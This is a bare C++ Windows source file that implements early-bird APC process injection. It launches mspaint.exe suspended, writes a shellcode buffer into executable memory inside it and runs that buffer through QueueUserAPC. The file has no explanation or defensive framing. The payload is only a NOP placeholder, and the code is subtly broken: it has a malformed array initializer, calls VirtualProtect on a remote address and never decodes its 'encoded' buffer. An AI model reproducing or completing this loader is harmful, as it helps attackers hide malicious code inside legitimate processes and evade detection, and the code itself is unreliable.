#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

DWORD WINAPI Shoot(LPVOID lpParameter)

{
	BOOL rv;
    DWORD oldmemory = 0;
unsigned char rawsc[] = [0x90};
	int length = sizeof(rawsc);
	
	if (rawsc == nullptr)
	{
		return 0;
	}
	
	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
	memcpy(encoded, rawsc, length);
	unsigned char* decoded = encoded;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE abuseProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	LPVOID shellAddress = VirtualAllocEx(abuseProcess, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(abuseProcess, shellAddress, decoded, length, NULL);
	rv = VirtualProtect(shellAddress, length, PAGE_EXECUTE_READ, &oldmemory);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);
	return 0;
}

int main(int argc, char** argv) {
    Shoot(NULL);

}
